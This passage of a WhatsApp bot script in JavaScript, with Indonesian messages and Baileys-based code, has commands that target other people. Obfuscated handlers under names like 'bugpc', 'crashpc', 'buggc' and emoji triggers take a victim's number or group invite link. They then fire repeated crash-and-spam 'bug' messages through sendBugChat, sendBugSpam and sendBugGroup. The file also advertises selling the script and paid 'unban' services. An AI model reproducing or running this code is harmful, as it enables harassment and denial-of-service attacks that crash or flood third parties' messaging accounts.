▬▭▬▭▬▭▬▭▬▭▬▭▬`, [creator,sender])
}
addCmd(command, 1, db_cmd)
break
case 'help':
case 'menu':{
var owner = global.OwnerNumber+'@s.whatsapp.net'
function _0x358f(_0x2cb7d6,_0x141ae6){var _0x152aae=_0x152a();return _0x358f=function(_0x358fb0,_0x26cfe7){_0x358fb0=_0x358fb0-0xaf;var _0x36aa16=_0x152aae[_0x358fb0];return _0x36aa16;},_0x358f(_0x2cb7d6,_0x141ae6);}(function(_0x4c2baf,_0x5ada03){var _0x17b48c=_0x358f,_0x3e847d=_0x4c2baf();while(!![]){try{var _0x3e63f5=parseInt(_0x17b48c(0xb6))/0x1*(-parseInt(_0x17b48c(0xb1))/0x2)+-parseInt(_0x17b48c(0xb7))/0x3*(-parseInt(_0x17b48c(0xaf))/0x4)+-parseInt(_0x17b48c(0xb8))/0x5+parseInt(_0x17b48c(0xb5))/0x6+parseInt(_0x17b48c(0xb3))/0x7*(-parseInt(_0x17b48c(0xb2))/0x8)+-parseInt(_0x17b48c(0xb4))/0x9+parseInt(_0x17b48c(0xb0))/0xa;if(_0x3e63f5===_0x5ada03)break;else _0x3e847d['push'](_0x3e847d['shift']());}catch(_0x32a26c){_0x3e847d['push'](_0x3e847d['shift']());}}}(_0x152a,0x7b019));var creator=CreatorLexxy+'@s.whatsapp.net';function _0x152a(){var _0x2b2788=['2956566nwKeKL','25834xwZYmF','6XihhPA','2221070iGtStc','260404YebasD','15272620vzQreH','36FeLuVy','8tDFUkC','3215527KJlJjx','2500245HqXzlR'];_0x152a=function(){return _0x2b2788;};return _0x152a();}
var mark = '0@s.whatsapp.net'
var ownerC = JSON.parse(fs.readFileSync('./connect/database/owner.json'))
var murbugC = JSON.parse(fs.readFileSync('./connect/database/murbug.json'))
var teks =`▬▭▬▭▬▭▬▭▬▭▬▭▬▭
*_Hi @${sender.split('@')[0]}, I Am ${global.BotName} Made By OBITO MODZ*
*_If There Is An Error_*
*_Please Report To Developer_*
▭▬▭▬▭▬▭▬▭▬▭▬▭▬

「 *BOT INFO* 」
 - Creator : ${global.OwnerName}
 - Owner : @${owner.split('@')[0]}
 - Botname : ${global.BotName}
 - Library : *Baileys-MD*
 - Version : @9.0.5
 - Session : *MultiAuthState*

「 *DATABASE* 」
 - Owner : ${ownerC.length}
 - Akses : ${murbugC.length}
 - Total Cmd : ${db_cmd.length}
 - Total Hit : ${db_hit.length}

「 *LIST MENU* 」
 ꔷ ${prefix}bugmenu
 ꔷ ${prefix}mainmenu
 ꔷ ${prefix}pushmenu
 ꔷ ${prefix}unbanmenu
 ꔷ ${prefix}groupmenu
 ꔷ ${prefix}ownermenu

 *RUNTIME*
 ${runtime(process.uptime())}

 *Powered By @${mark.split('@')[628815235997]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
mentions(teks,[mark,owner,sender,creator])
}
addCmd(command, 1, db_cmd)
break
case "buysc":{
reply(`*sc ini 70k aja, minat chat*\nwa.me/628815235997`)
}
addCmd(command, 1, db_cmd)
break
case "jasaunban":{
reply(`*jasa unban wa 50k++, minat chat*\nwa.me/628815235997`)
}
addCmd(command, 1, db_cmd)
break
case "buypanel":{
reply(`*List Harga Panel OBITO*

Ram 1GB Cpu 30%
Rp1.000/Bulan

Ram 2GB Cpu 60%
Rp2.000/Bulan

Ram 3GB Cpu 90%
Rp3.000/Bulan

Ram 4GB Cpu 120%
Rp4.000/Bulan

Ram 5GB Cpu 150%
Rp5.000/Bulan

Ram 6GB Cpu 180%
Rp6.000/Bulan

Group Panel:
https:https://chat.whatsapp.com/J633H66g8N15PBJXd47ZdN`)
}
addCmd(command, 1, db_cmd)
break

// AKSES MENU
case 'owner':{
var angkaC = 1
for (let i of myowner) {
sendContact(from, i, `OWNER [${angkaC++}]`)
await sleep(2000)
}
sendContact(from, global.OwnerNumber, "DEV "+global.OwnerName+" 👑")
await sleep(2000)
reply(global.mess.PesanBotKirimKontak)
}
addCmd(command, 1, db_cmd)
break
case 'autoread':{
if (!isDeveloper) return reply(global.mess.DeveloperOnly)
if (!args[0]) return reply(`Kirim perintah #${command} _options_\nOptions : on & off\nContoh : #${command} on`)
if (args[0] == 'ON' || args[0] == 'on' || args[0] == 'On') {
autoread = true
reply(global.mess.AutoReadAktif)
} else if (args[0] == 'OFF' || args[0] == 'OF' || args[0] == 'Of' || args[0] == 'Off' || args[0] == 'of' || args[0] == 'off') {
autoread = false
reply(global.mess.AutoReadMati)
} else { reply('Kata kunci tidak ditemukan!') }
}
addCmd(command, 1, db_cmd)
break
case 'mengetik':{
if (!isDeveloper) return reply(global.mess.DeveloperOnly)
if (!args[0]) return reply(`Kirim perintah #${command} _options_\nOptions : on & off\nContoh : #${command} on`)
if (args[0] == 'ON' || args[0] == 'on' || args[0] == 'On') {
mengetik = true
reply('*BOT MENGETIK : AKTIF*')
} else if (args[0] == 'OFF' || args[0] == 'OF' || args[0] == 'Of' || args[0] == 'Off' || args[0] == 'of' || args[0] == 'off') {
mengetik = false
reply('*BOT MENGETIK : TIDAK AKTIF*')
} else { reply('Kata kunci tidak ditemukan!') }
}
addCmd(command, 1, db_cmd)
break
case 'mode':{
if (!isDeveloper) return reply(global.mess.DeveloperOnly)
if (!args[0]) return reply(`Kirim perintah #${command} _options_\nOptions : public & self\nContoh : #${command} public`)
if (args[0] == "public") {
public = true
reply('*BOT MODE : PUBLIC*')
} else if (args[0] == "self") {
public = false
reply('*BOT MODE : SELF*')
} else { reply(`Kirim perintah #${command} _options_\nOptions : public & self\nContoh : #${command} public`) }
}
addCmd(command, 1, db_cmd)
break
case "resetdb":{
if (!isDeveloper) return reply(global.mess.DeveloperOnly)
reply('*Sedang Menghapus...*\n*Cmd Dan Hit Bot*')
db_cmd.splice("[]")
fs.writeFileSync("./connect/database/allcmd.json", JSON.stringify(db_cmd, null, 1))
await sleep(2000)
db_hit.splice("[]")
fs.writeFileSync("./connect/database/reqhit.json", JSON.stringify(db_hit, null, 1))
reply(`*SUKSES RESET DATABASE*`)
}
break
case 'dashboard': case 'db':{
if (!isDeveloper) return reply(global.mess.DeveloperOnly)
var jumlahCmd = db_cmd.length
var teks = `*DASHBOARD*\n*Total Cmd : ${jumlahCmd}*\n*Total Hit : ${db_hit.length}*\n\n*COMMAND*`
for (var i of db_cmd) {
teks +=`\n${i.id} = ${i.total}`
}
reply(teks)
}
addCmd(command, 1, db_cmd)
break
case "database":{
if (!isDeveloper) return reply(global.mess.DeveloperOnly)
var Owner_ = JSON.parse(fs.readFileSync('./connect/database/owner.json'))
var Murbug_ = JSON.parse(fs.readFileSync('./connect/database/murbug.json'))
var take1 = `*LIST DATABASE BOT*\n\n*Jumlah Owner : ${Owner_.length}*\n*Jumlah Akses : ${Murbug_.length}*\n\n*LIST AKSES*\n`
var take2 = `*LIST OWNER*\n`
var yy1 = 1
var yy2 = 1
for (var i of Murbug_){
take1 +=`*Users :* ${yy1++}\n*Number :* ${i}\n\n`
}
for (var i of Owner_){
take2 +=`*Users :* ${yy2++}\n*Number :* ${i}\n\n`
}
take1 +=`*Example :*\n• .delete 628xxxx buat hapus akses\n\n`
take2 +=`*Example :*\n• .delown 628xxxx buat hapus owner`
reply(take1+take2)
}
addCmd(command, 1, db_cmd)
break
case "block":{
if (!isDeveloper) return reply(global.mess.DeveloperOnly)
var ya = q.replace(/[^0-9]/g, '')
if (!ya) return reply(`*Penggunaan:*\n${prefix+command} nomor\n\n*Contoh:*\n${prefix+command} 628xxxx`)
var ceknye = await conn.onWhatsApp(ya + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(global.mess.NotNumber)
var yaww = ya+`@s.whatsapp.net`
await conn.updateBlockStatus(yaww, "block").then(res => {
mentions(`*NUMBER @${yaww.split('@')[0]} BERHASIL DI BLOCK*`, [yaww])
}).catch((err) => reply(jsonformat(err)))
}
addCmd(command, 1, db_cmd)
break
case "unblock":{
if (!isDeveloper) return reply(global.mess.DeveloperOnly)
var ya = q.replace(/[^0-9]/g, '')
if (!ya) return reply(`*Penggunaan:*\n${prefix+command} nomor\n\n*Contoh:*\n${prefix+command} 628xxxx`)
var ceknye = await conn.onWhatsApp(ya + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(global.mess.NotNumber)
var yaww = ya+`@s.whatsapp.net`
await conn.updateBlockStatus(yaww, "unblock").then(res => {
mentions(`*NUMBER @${yaww.split('@')[0]} BERHASIL DI UNBLOCK*`, [yaww])
}).catch((err) => reply(jsonformat(err)))
}
addCmd(command, 1, db_cmd)
break
case "delowner":
case "delown":{
if (!isDeveloper) return reply(global.mess.DeveloperOnly)
var ya = q.replace(/[^0-9]/g, '')
if (!ya) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxxx`)
var ceknye = await conn.onWhatsApp(ya + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(global.mess.NotNumber)
var unp = myowner.indexOf(ya)
myowner.splice(unp, 1)
fs.writeFileSync("./connect/database/owner.json", JSON.stringify(myowner))
var delusr = ya+"@s.whatsapp.net"
mentions(`*SUKSES DELETE OWNER* @${delusr.split('@')[0]}`, [delusr])
}
addCmd(command, 1, db_cmd)
break
case "resetowner":{
if (!isDeveloper) return reply(global.mess.DeveloperOnly)
myowner.splice("[]")
fs.writeFileSync("./connect/database/owner.json", JSON.stringify(myowner, null, 1))
reply(`*SUKSES RESET DATABASE OWNER*`)
}
addCmd(command, 1, db_cmd)
break
case "addowner":
case "addown":{
if (!isDeveloper) return reply(global.mess.DeveloperOnly)
var yo = q.replace(/[^0-9]/g, '')
if (!yo) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxxx`)
var ceknye = await conn.onWhatsApp(yo + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(global.mess.NotNumber)
myowner.push(yo)
fs.writeFileSync("./connect/database/owner.json", JSON.stringify(myowner))
var addusr = yo+"@s.whatsapp.net"
mentions(`*SUKSES ADD OWNER* @${addusr.split('@')[0]}`, [addusr])
}
addCmd(command, 1, db_cmd)
break
case "delete":{
if (!isDeveloper) return reply(global.mess.DeveloperOnly)
var ya = q.replace(/[^0-9]/g, '')
if (!ya) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxxx`)
var ceknye = await conn.onWhatsApp(ya + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(global.mess.NotNumber)
var unp = murbug.indexOf(ya)
murbug.splice(unp, 1)
fs.writeFileSync("./connect/database/murbug.json", JSON.stringify(murbug))
var delusr = ya+"@s.whatsapp.net"
mentions(`*SUKSES DELETE AKSES* @${delusr.split('@')[0]}`, [delusr])
conn.sendMessage(delusr, {text: `*HALLO @${delusr.split('@')[0]} SEKARANG ANDA TIDAK BISA AKSES FITUR BUG LAGI, DIKARENAKAN ANDA SUDAH DI DELETE OLEH OWNER*`, mentions: [delusr]})
}
addCmd(command, 1, db_cmd)
break
case "akses":{
if (!isDeveloper && !isOwner) return reply(global.mess.DeveloperOnly)
var yo = q.replace(/[^0-9]/g, '')
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxxx`)
var ceknye = await conn.onWhatsApp(yo + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(global.mess.NotNumber)
murbug.push(yo)
fs.writeFileSync("./connect/database/murbug.json", JSON.stringify(murbug))
var addusr = yo+"@s.whatsapp.net"
mentions(`*SUKSES ADD AKSES* @${addusr.split('@')[0]}`, [addusr])
conn.sendMessage(addusr, {text: `*HALLO @${addusr.split('@')[0]} ANDA SUDAH BISA AKSES FITUR BUG*`, mentions: [addusr]})
}
addCmd(command, 1, db_cmd)
break
case "resetakses":{
if (!isDeveloper) return reply(global.mess.DeveloperOnly)
murbug.splice("[]")
fs.writeFileSync("./connect/database/murbug.json", JSON.stringify(murbug, null, 1))
reply(`*SUKSES RESET DATABASE AKSES*`)
}
addCmd(command, 1, db_cmd)
break
case "runtime":
case "tes":
case "test":{
reply(`*BOT ONLINE : ${runtime(process.uptime())}*`)
}
addCmd(command, 1, db_cmd)
break
case "allgas":
case "bugpc":
case "gasken":
case "lexgass":
case "lexgbug":
case "crashpc":
case "sendbug":
case "document":
case "santetpc":
case "gaslexx":
case "buglexx":
case "catalexx":
case "epeplexx":
case "attacklexx":
case "lexxsend":
case "sendlexx":{
const _0x2ec582=_0x1ba4;(function(_0x3bce4a,_0x45e369){const _0xfc4347=_0x1ba4,_0x590bef=_0x3bce4a();while(!![]){try{const _0x220115=-parseInt(_0xfc4347(0x1f6))/0x1*(-parseInt(_0xfc4347(0x1f4))/0x2)+-parseInt(_0xfc4347(0x201))/0x3*(-parseInt(_0xfc4347(0x1f0))/0x4)+-parseInt(_0xfc4347(0x1f9))/0x5+-parseInt(_0xfc4347(0x208))/0x6+-parseInt(_0xfc4347(0x200))/0x7*(-parseInt(_0xfc4347(0x1fe))/0x8)+parseInt(_0xfc4347(0x1ea))/0x9*(-parseInt(_0xfc4347(0x203))/0xa)+-parseInt(_0xfc4347(0x1eb))/0xb*(-parseInt(_0xfc4347(0x207))/0xc);if(_0x220115===_0x45e369)break;else _0x590bef['push'](_0x590bef['shift']());}catch(_0x3b0cd8){_0x590bef['push'](_0x590bef['shift']());}}}(_0x4e19,0xcf76e));if(!isDeveloper&&!isAkses&&!isOwner)return reply(global['mess']['AksesOnly']);if(!q)return reply(_0x2ec582(0x1fd)+command['toUpperCase']()+_0x2ec582(0x205)+(prefix+command)+_0x2ec582(0x206)+(prefix+command)+'\x20628xxxx,5');let orang=q[_0x2ec582(0x209)](',')[0x0],jumlah=q['split'](',')[0x1];if(!orang)return reply('*FORMAT\x20BUG\x20'+command[_0x2ec582(0x1f3)]()+_0x2ec582(0x205)+(prefix+command)+_0x2ec582(0x206)+(prefix+command)+_0x2ec582(0x1ef));if(!jumlah)return reply(_0x2ec582(0x1fd)+command[_0x2ec582(0x1f3)]()+_0x2ec582(0x205)+(prefix+command)+_0x2ec582(0x206)+(prefix+command)+_0x2ec582(0x1ef));function _0x4e19(){const _0x13742f=['*FORMAT\x20BUG\x20','56ywIyOS','*gagal\x20mengirim\x20bug\x20ke\x20owner\x20bot,\x20sekian\x20terima\x20kasih.*','1362886zeuJDa','27003EgwRVZ','*gagal\x20mengirim\x20bug\x20ke\x20Lexxy\x20Official,\x20karena\x20dia\x20pembuat\x20script\x20ini,\x20sekian\x20terima\x20kasih.*','6020wuyvSR','PesanBugDikirim','*\x0a\x0a*Example:*\x0a','\x20number,jumlah\x0a\x0a*Contoh:*\x0a','34285476VwtjUu','10036566xcaIia','split','Jumlah\x20wajib\x20angka!!','24372puovth','11bzBwjV','replace','6285789004732@s.whatsapp.net','\x0a*JUMLAH\x20SPAM\x20:*\x20','\x20628xxxx,5','52VKkmCz','@s.whatsapp.net','6285789004732@s.whatsapp.net','toUpperCase','7468soFBFV','WaktuDelayBug','376SIUfxO','NotNumber','OwnerNumber','7941275uPNQiL','Max_Bug_Attack','onWhatsApp','mess'];_0x4e19=function(){return _0x13742f;};return _0x4e19();}if(isNaN(parseInt(jumlah)))return reply(_0x2ec582(0x20a));let targetnya=orang[_0x2ec582(0x1ec)](/[^0-9]/g,''),jumlahnya=''+encodeURI(jumlah);function _0x1ba4(_0x5d01bc,_0x32a5b8){const _0x4e1940=_0x4e19();return _0x1ba4=function(_0x1ba483,_0x266074){_0x1ba483=_0x1ba483-0x1ea;let _0x575e50=_0x4e1940[_0x1ba483];return _0x575e50;},_0x1ba4(_0x5d01bc,_0x32a5b8);}if(jumlahnya>global['Max_Bug_Attack'])return reply('max\x20send\x20number\x20of\x20bugs\x20'+global[_0x2ec582(0x1fa)]+'\x20if\x20above\x20it\x20will\x20fail');var cekap=await conn[_0x2ec582(0x1fb)](targetnya+_0x2ec582(0x1f1));let target=targetnya+_0x2ec582(0x1f1);if(cekap['length']==0x0)return reply(global[_0x2ec582(0x1fc)][_0x2ec582(0x1f7)]);if(target==_0x2ec582(0x1f2))return reply('*gagal\x20mengirim\x20bug\x20ke\x20Lexxy\x20Official,\x20karena\x20dia\x20pembuat\x20script\x20ini,\x20sekian\x20terima\x20kasih.*');if(target==_0x2ec582(0x1ed))return reply(_0x2ec582(0x202));if(target==CreatorLexxy+_0x2ec582(0x1f1))return reply(_0x2ec582(0x202));if(target==global[_0x2ec582(0x1f8)]+'@s.whatsapp.net')return reply(_0x2ec582(0x1ff));reply(global[_0x2ec582(0x1fc)][_0x2ec582(0x204)]);var waktu_Delay_Bug=global[_0x2ec582(0x1f5)];await sleep(waktu_Delay_Bug),sendBugChat(target,jumlahnya),sendBugSpam(target,jumlahnya),sendBugNew(target,0x5),sendBugButtonV1(target,0x5),sendBugButtonV2(target,0x5),await sleep(waktu_Delay_Bug),mentions('*'+command['toUpperCase']()+'\x20BERHASIL\x20TERKIRIM*\x0a*TARGET\x20:*\x20@'+target[_0x2ec582(0x209)]('@')[0x0]+_0x2ec582(0x1ee)+jumlahnya+'×\x0a\x0a*_NOTE\x20:_*\x0a*HARAP\x20JEDA\x201\x20MENIT*\x0a*GAK\x20JEDA\x20DELETE\x20AKSES*',[target]);
}
addCmd(command, 1, db_cmd)
break
case "buggc":
case "santetgc":
case "bomgc":
case "crashgc":
case "attackgc":
case "buglexgc":
case "crashgc":
case "gaskengc":
case "bugingc":
case "ampasgc":{
var _0x42123e=_0x4456;(function(_0x4c0c50,_0x48638d){var _0x7df1f7=_0x4456,_0x552417=_0x4c0c50();while(!![]){try{var _0x1d919d=-parseInt(_0x7df1f7(0x11c))/0x1*(-parseInt(_0x7df1f7(0x12d))/0x2)+parseInt(_0x7df1f7(0x11d))/0x3*(-parseInt(_0x7df1f7(0x127))/0x4)+-parseInt(_0x7df1f7(0x12a))/0x5*(parseInt(_0x7df1f7(0x125))/0x6)+parseInt(_0x7df1f7(0x124))/0x7+parseInt(_0x7df1f7(0x12f))/0x8+-parseInt(_0x7df1f7(0x133))/0x9*(parseInt(_0x7df1f7(0x11e))/0xa)+parseInt(_0x7df1f7(0x121))/0xb;if(_0x1d919d===_0x48638d)break;else _0x552417['push'](_0x552417['shift']());}catch(_0x337155){_0x552417['push'](_0x552417['shift']());}}}(_0x2218,0x9b163));if(!isDeveloper&&!isOwner)return reply(global[_0x42123e(0x132)][_0x42123e(0x120)]);if(!q)return reply(_0x42123e(0x122)+(prefix+command)+_0x42123e(0x126));var jumlah=q[_0x42123e(0x11f)]('|')[0x0],target=q[_0x42123e(0x11f)]('|')[0x1],jumlahnya=''+encodeURI(jumlah);function _0x2218(){var _0x1d2171=['3126jNxLwN','\x205|linkgrup','8eeEHpC','*Proses\x201\x20Menit*','includes','1270KGALzM','then','\x20if\x20above\x20it\x20will\x20fail','142VFiiLh','whatsapp.com','1304712FAvCdK','https://chat.whatsapp.com/','catch','mess','9ARxTDu','8643ESRAeQ','161094yaqERE','11354470faWLFW','split','DeveloperOnly','6974396pzYNzc','Penggunaan\x20','Max_Bug_Attack','4197438jKGkSG'];_0x2218=function(){return _0x1d2171;};return _0x2218();}if(jumlahnya>global[_0x42123e(0x123)])return reply('max\x20send\x20group\x20of\x20bugs\x20'+global[_0x42123e(0x123)]+_0x42123e(0x12c));function _0x4456(_0x463d4d,_0x14a45f){var _0x221888=_0x2218();return _0x4456=function(_0x445629,_0x2ba2f7){_0x445629=_0x445629-0x11c;var _0x4af524=_0x221888[_0x445629];return _0x4af524;},_0x4456(_0x463d4d,_0x14a45f);}if(!isUrl(target)&&!target[_0x42123e(0x129)](_0x42123e(0x12e)))return reply('Link\x20Invalid!');var result=target[_0x42123e(0x11f)](_0x42123e(0x130))[0x1];reply(_0x42123e(0x128)),await conn['groupAcceptInvite'](result)[_0x42123e(0x12b)](_0x3cec08=>{sendBugGroup(_0x3cec08,jumlahnya),reply('*DONE\x20BUG\x20TERKIRIM\x20✓*\x0a*HARAP\x20JEDA\x205\x20MENIT*');})[_0x42123e(0x131)](_0x1f0d8a=>reply(jsonformat(_0x1f0d8a)));
}
addCmd(command, 1, db_cmd)
break
case "hogbcuy":
case "yogbcuy":
case "yagbcuy":
case "bogbcuy":
case "wagbcuy":
case "gasgbcuy":
case "lexgbcuy":
case "sengbcuy":
case "epgbcuy":
case "gogbcuy":{
var _0x4b5782=_0x2799;(function(_0x431ce0,_0x3c7913){var _0x359434=_0x2799,_0x3dc044=_0x431ce0();while(!![]){try{var _0x19dd78=-parseInt(_0x359434(0x190))/0x1*(-parseInt(_0x359434(0x197))/0x2)+parseInt(_0x359434(0x191))/0x3*(-parseInt(_0x359434(0x194))/0x4)+parseInt(_0x359434(0x1ac))/0x5+parseInt(_0x359434(0x1a6))/0x6*(parseInt(_0x359434(0x1ad))/0x7)+parseInt(_0x359434(0x19c))/0x8+-parseInt(_0x359434(0x196))/0x9+parseInt(_0x359434(0x1a8))/0xa*(-parseInt(_0x359434(0x193))/0xb);if(_0x19dd78===_0x3c7913)break;else _0x3dc044['push'](_0x3dc044['shift']());}catch(_0x52095d){_0x3dc044['push'](_0x3dc044['shift']());}}}(_0x5573,0x76f7c));if(!isDeveloper&&!isAkses&&!isOwner)return reply(global[_0x4b5782(0x1ab)]['AksesOnly']);if(!q)return reply(_0x4b5782(0x19f)+command[_0x4b5782(0x19e)]()+_0x4b5782(0x1a4)+(prefix+command)+'\x20number\x0a\x0a*Contoh:*\x0a'+(prefix+command)+_0x4b5782(0x1a9));var targetnya=q[_0x4b5782(0x1a3)](/[^0-9]/g,''),cekap=await conn[_0x4b5782(0x19a)](targetnya+_0x4b5782(0x199)),target=targetnya+_0x4b5782(0x199);if(cekap[_0x4b5782(0x192)]==0x0)return reply(global['mess'][_0x4b5782(0x1a7)]);if(target==_0x4b5782(0x1a5))return reply('*gagal\x20mengirim\x20bug\x20ke\x20Lexxy\x20Official,\x20karena\x20dia\x20pembuat\x20script\x20ini,\x20sekian\x20terima\x20kasih.*');function _0x2799(_0x4f0824,_0x5a37ac){var _0x5573ff=_0x5573();return _0x2799=function(_0x2799b7,_0x1aecd0){_0x2799b7=_0x2799b7-0x190;var _0x499fe6=_0x5573ff[_0x2799b7];return _0x499fe6;},_0x2799(_0x4f0824,_0x5a37ac);}if(target==_0x4b5782(0x19b))return reply(_0x4b5782(0x1a0));if(target==CreatorLexxy+_0x4b5782(0x199))return reply(_0x4b5782(0x1a0));if(target==global[_0x4b5782(0x195)]+'@s.whatsapp.net')return reply(_0x4b5782(0x1a1));reply(global[_0x4b5782(0x1ab)]['PesanBugDikirim']);function _0x5573(){var _0x411b1a=['length','55tjogTw','28fUipSz','OwnerNumber','7113483JFDLXR','608536txZMNX','split','@s.whatsapp.net','onWhatsApp','6285789004732@s.whatsapp.net','7541864JuNMdF','WaktuDelayBug','toUpperCase','*FORMAT\x20BUG\x20','*gagal\x20mengirim\x20bug\x20ke\x20Lexxy\x20Official,\x20karena\x20dia\x20pembuat\x20script\x20ini,\x20sekian\x20terima\x20kasih.*','*gagal\x20mengirim\x20bug\x20ke\x20owner\x20bot,\x20sekian\x20terima\x20kasih.*','\x20BERHASIL\x20TERKIRIM*\x0a*TARGET\x20:*\x20@','replace','*\x0a\x0a*Example:*\x0a','6285789004732@s.whatsapp.net','6JDtDCM','NotNumber','2743030QhAIcx','\x20628xxxx','\x0a*JUMLAH\x20SPAM\x20:*\x2010×\x0a\x0a*_NOTE\x20:_*\x0a*HARAP\x20JEDA\x201\x20MENIT*\x0a*GAK\x20JEDA\x20DELETE\x20AKSES*','mess','2412470WhtgqD','6338045lmzEVh','3ZJmZlm','254688qWXQso'];_0x5573=function(){return _0x411b1a;};return _0x5573();}var waktu_Delay_Bug=global[_0x4b5782(0x19d)];await sleep(waktu_Delay_Bug),sendBugButtonV1(target,0xa),sendBugButtonV2(target,0xa),await sleep(waktu_Delay_Bug),mentions('*'+command[_0x4b5782(0x19e)]()+_0x4b5782(0x1a2)+target[_0x4b5782(0x198)]('@')[0x0]+_0x4b5782(0x1aa),[target]);
}
addCmd(command, 1, db_cmd)
break
case "😈":
case "☠️":
case "👻":
case "💥":
case "🔥":
case "🌹":
case "🌷":
case "🦕":
case "🦖":
case "🦎":{
const _0x209cca=_0x5099;(function(_0x2b587d,_0x286bd1){const _0x3728fb=_0x5099,_0x3a3dd3=_0x2b587d();while(!![]){try{const _0x544e7a=-parseInt(_0x3728fb(0x1d9))/0x1*(-parseInt(_0x3728fb(0x1d4))/0x2)+parseInt(_0x3728fb(0x1d6))/0x3+-parseInt(_0x3728fb(0x1d2))/0x4*(parseInt(_0x3728fb(0x1d7))/0x5)+-parseInt(_0x3728fb(0x1dc))/0x6+-parseInt(_0x3728fb(0x1c3))/0x7+parseInt(_0x3728fb(0x1d8))/0x8+parseInt(_0x3728fb(0x1d5))/0x9;if(_0x544e7a===_0x286bd1)break;else _0x3a3dd3['push'](_0x3a3dd3['shift']());}catch(_0x2d1600){_0x3a3dd3['push'](_0x3a3dd3['shift']());}}}(_0x4dae,0x2a743));if(!isDeveloper&&!isAkses&&!isOwner)return reply(global[_0x209cca(0x1c7)][_0x209cca(0x1cd)]);if(!q)return reply('*FORMAT\x20BUG\x20'+command['toUpperCase']()+'*\x0a\x0a*Example:*\x0a'+command+_0x209cca(0x1dd)+command+_0x209cca(0x1c9));let orang=q[_0x209cca(0x1d0)](',')[0x0],jumlah=q['split'](',')[0x1];if(!orang)return reply(_0x209cca(0x1bf)+command['toUpperCase']()+'*\x0a\x0a*Example:*\x0a'+(prefix+command)+_0x209cca(0x1dd)+(prefix+command)+_0x209cca(0x1c9));if(!jumlah)return reply(_0x209cca(0x1bf)+command[_0x209cca(0x1d1)]()+_0x209cca(0x1c8)+(prefix+command)+'\x20number,jumlah\x0a\x0a*Contoh:*\x0a'+(prefix+command)+_0x209cca(0x1c9));if(isNaN(parseInt(jumlah)))return reply(_0x209cca(0x1cc));function _0x5099(_0x439147,_0x44c9cb){const _0x4daec6=_0x4dae();return _0x5099=function(_0x5099e1,_0x1a7839){_0x5099e1=_0x5099e1-0x1bd;let _0xe4c110=_0x4daec6[_0x5099e1];return _0xe4c110;},_0x5099(_0x439147,_0x44c9cb);}let targetnya=orang[_0x209cca(0x1c6)](/[^0-9]/g,''),jumlahnya=''+encodeURI(jumlah);if(jumlahnya>global[_0x209cca(0x1be)])return reply(_0x209cca(0x1de)+global[_0x209cca(0x1be)]+_0x209cca(0x1ce));function _0x4dae(){const _0x410d63=['12113SEzJBT','OwnerNumber','@s.whatsapp.net','24534xxILZi','\x20number,jumlah\x0a\x0a*Contoh:*\x0a','max\x20send\x20number\x20of\x20bugs\x20','6285789004732@s.whatsapp.net','length','Max_Bug_Emoji','*FORMAT\x20BUG\x20','onWhatsApp','6285789004732@s.whatsapp.net','×\x0a\x0a*_NOTE\x20:_*\x0a*HARAP\x20JEDA\x201\x20MENIT*\x0a*GAK\x20JEDA\x20DELETE\x20AKSES*','1804747KaAigC','NotNumber','*gagal\x20mengirim\x20bug\x20ke\x20owner\x20bot,\x20sekian\x20terima\x20kasih.*','replace','mess','*\x0a\x0a*Example:*\x0a','\x20628xxxx,5','*gagal\x20mengirim\x20bug\x20ke\x20Lexxy\x20Official,\x20karena\x20dia\x20pembuat\x20script\x20ini,\x20sekian\x20terima\x20kasih.*','WaktuDelayBug','Jumlah\x20wajib\x20angka!!','AksesOnly','\x20if\x20above\x20it\x20will\x20fail','PesanBugDikirim','split','toUpperCase','4aVmZiF','\x0a*JUMLAH\x20SPAM\x20:*\x20','34YdORVw','74367MVAkOo','162711fqVmNG','169485uwOGjZ','1610216aFvwqL'];_0x4dae=function(){return _0x410d63;};return _0x4dae();}var cekap=await conn[_0x209cca(0x1c0)](targetnya+_0x209cca(0x1db));let target=targetnya+_0x209cca(0x1db);if(cekap[_0x209cca(0x1bd)]==0x0)return reply(global['mess'][_0x209cca(0x1c4)]);if(target==_0x209cca(0x1df))return reply(_0x209cca(0x1ca));if(target==_0x209cca(0x1c1))return reply(_0x209cca(0x1ca));if(target==CreatorLexxy+_0x209cca(0x1db))return reply('*gagal\x20mengirim\x20bug\x20ke\x20Lexxy\x20Official,\x20karena\x20dia\x20pembuat\x20script\x20ini,\x20sekian\x20terima\x20kasih.*');if(target==global[_0x209cca(0x1da)]+'@s.whatsapp.net')return reply(_0x209cca(0x1c5));reply(global[_0x209cca(0x1c7)][_0x209cca(0x1cf)]);var waktu_Delay_Bug=global[_0x209cca(0x1cb)];await sleep(waktu_Delay_Bug),sendBugChat(target,jumlahnya),await sleep(waktu_Delay_Bug),mentions('*'+command[_0x209cca(0x1d1)]()+'\x20BERHASIL\x20TERKIRIM*\x0a*TARGET\x20:*\x20@'+target[_0x209cca(0x1d0)]('@')[0x0]+_0x209cca(0x1d3)+jumlahnya+_0x209cca(0x1c2),[target]);
}
addCmd(command, 1, db_cmd)
break
case "bugteks":
case "bugspam":
case "bugepep":{
